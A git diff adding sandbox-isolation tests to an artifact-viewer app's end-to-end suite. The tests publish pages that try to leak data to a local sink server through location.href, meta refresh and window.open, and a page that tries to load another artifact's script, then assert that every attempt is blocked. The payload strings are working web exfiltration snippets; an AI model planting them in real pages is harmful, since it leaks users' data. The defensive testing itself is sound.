@@ -2,6 +2,7 @@ import assert from 'node:assert/strict'
 import { existsSync, mkdtempSync, rmSync } from 'node:fs'
 import { homedir, tmpdir } from 'node:os'
 import { join } from 'node:path'
+import { createServer, type Server } from 'node:http'
 import { after, before, test } from 'node:test'
 import { serve, type ServerType } from '@hono/node-server'
 import { chromium, type Browser } from 'playwright-core'
@@ -24,6 +25,7 @@ const chromiumPath = findChromium()
 const TOKEN = 'e2e-token-0123456789'
 const APP_PORT = 18790
 const CONTENT_PORT = 18791
+const SINK_PORT = 18799
 let dir: string
 let store: ArtifactStore
 let servers: ServerType[] = []
@@ -91,4 +93,52 @@ test('a sandboxed page reaches its capabilities only through the viewer, live ac
   assert.equal(store.listAssets(id)[0]?.source, 'page')
 
   assert.equal(await frameOf(first).locator('#leak').textContent(), 'no')
+})
+
+async function listenSink(): Promise<{ hits: string[]; server: Server }> {
+  const hits: string[] = []
+  const server = createServer((req, res) => {
+    hits.push(req.url ?? '')
+    res.end('<!doctype html><title>sink</title><script>window.addEventListener("message", () => {})</script>')
+  })
+  await new Promise<void>((resolve) => server.listen(SINK_PORT, '127.0.0.1', resolve))
+  return { hits, server }
+}
+
+const EXFIL_PAGES: Record<string, string> = {
+  'location.href': `<script>location.href = 'http://127.0.0.1:${SINK_PORT}/leak?d=secret'</script>`,
+  'meta refresh': `<meta http-equiv="refresh" content="0;url=http://127.0.0.1:${SINK_PORT}/leak?d=secret">`,
+  'window.open': `<button id="go" onclick="window.open('http://127.0.0.1:${SINK_PORT}/leak?d=secret')">go</button><script>window.open('http://127.0.0.1:${SINK_PORT}/leak?d=secret'); document.getElementById('go').click()</script>`
+}
+
+for (const [name, body] of Object.entries(EXFIL_PAGES)) {
+  test(`a sandboxed page cannot send data out by navigation (${name})`, { skip: !chromiumPath && 'no Chromium found' }, async () => {
+    const sink = await listenSink()
+    try {
+      const { id } = store.publish({ title: 'Exfil', capabilities: ['db'], files: { 'index.html': { content: Buffer.from(`<!doctype html><html><head></head><body>${body}</body></html>`) } } })
+      const context = await browser.newContext()
+      const page = await context.newPage()
+      await page.goto(`http://localhost:${APP_PORT}/a/${id}`)
+      await page.waitForTimeout(1500)
+      assert.deepEqual(sink.hits, [])
+      assert.equal(context.pages().length, 1)
+      assert.ok(page.frames().every((frame) => !frame.url().includes(`:${SINK_PORT}`)))
+      await context.close()
+    } finally {
+      sink.server.close()
+    }
+  })
+}
+
+test('an artifact page cannot load another artifact\'s files', { skip: !chromiumPath && 'no Chromium found' }, async () => {
+  const other = store.publish({ title: 'Other', files: { 'index.html': { content: Buffer.from('x') }, 'data.js': { content: Buffer.from("window.STOLEN = 'yes'") } } })
+  const page = `<!doctype html><html><head></head><body><p id="seen">no</p>
+<script src="http://127.0.0.1:${CONTENT_PORT}/a/${other.id}/v/1/data.js"></script>
+<script>document.getElementById('seen').textContent = typeof window.STOLEN === 'undefined' ? 'no' : 'yes'</script></body></html>`
+  const { id } = store.publish({ title: 'Mine', files: { 'index.html': { content: Buffer.from(page) } } })
+  const viewer = await browser.newPage()
+  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
+  await viewer.frameLocator('#frame').locator('#seen').waitFor()
+  assert.equal(await viewer.frameLocator('#frame').locator('#seen').textContent(), 'no')
+  await viewer.close()
 })
